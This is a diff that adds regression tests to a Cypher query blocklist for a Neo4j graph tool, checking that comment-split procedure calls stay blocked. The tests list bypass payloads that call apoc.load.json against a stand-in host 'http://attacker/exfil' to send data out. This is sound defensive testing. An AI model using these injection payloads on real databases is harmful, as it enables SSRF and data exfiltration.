@@ -84,6 +84,37 @@ def test_query_graph_blocks_merge_case_insensitive():
     _assert_error(env, code="write_blocked", retryable=False)
 
 
+def test_query_graph_blocks_comment_split_procedure_calls():
+    """Regression: Cypher ignores comments, so a comment placed between `CALL`
+    and the procedure namespace used to slip past `_WRITE_PATTERN` entirely.
+
+    That mattered because the blocklist is the only barrier — Neo4j boots with
+    `NEO4J_dbms_security_procedures_unrestricted=apoc.*` and queries run in the
+    driver's default (write) access mode — so a bypass reached `apoc.load.json`
+    (SSRF/exfiltration) and `apoc.cypher.doIt` (arbitrary writes).
+    """
+    bypasses = [
+        'CALL /*x*/apoc.load.json("http://attacker/exfil")',
+        'CALL //c\napoc.load.json("http://attacker/exfil")',
+        "CALL dbms/*x*/.components()",
+        "CALL\napoc.load.json('http://attacker/exfil')",
+        "CALL apoc . load.json('http://attacker/exfil')",
+    ]
+    for cypher in bypasses:
+        env = query_graph.run({"session_id": "s1", "cypher": cypher})
+        _assert_error(env, code="write_blocked", retryable=False)
+
+
+def test_query_graph_comment_strip_preserves_string_literals():
+    """A URL inside a string literal contains `//`, but stripping from there to
+    end-of-line would swallow a following write verb and create a NEW bypass.
+    Comments are only removed outside quoted literals, so this stays blocked."""
+    env = query_graph.run(
+        {"session_id": "s1", "cypher": 'MATCH (n) WHERE n.u = "http://x" CREATE (m)'}
+    )
+    _assert_error(env, code="write_blocked", retryable=False)
+
+
 def test_query_graph_appends_limit_when_absent(monkeypatch):
     seen: dict = {}
 
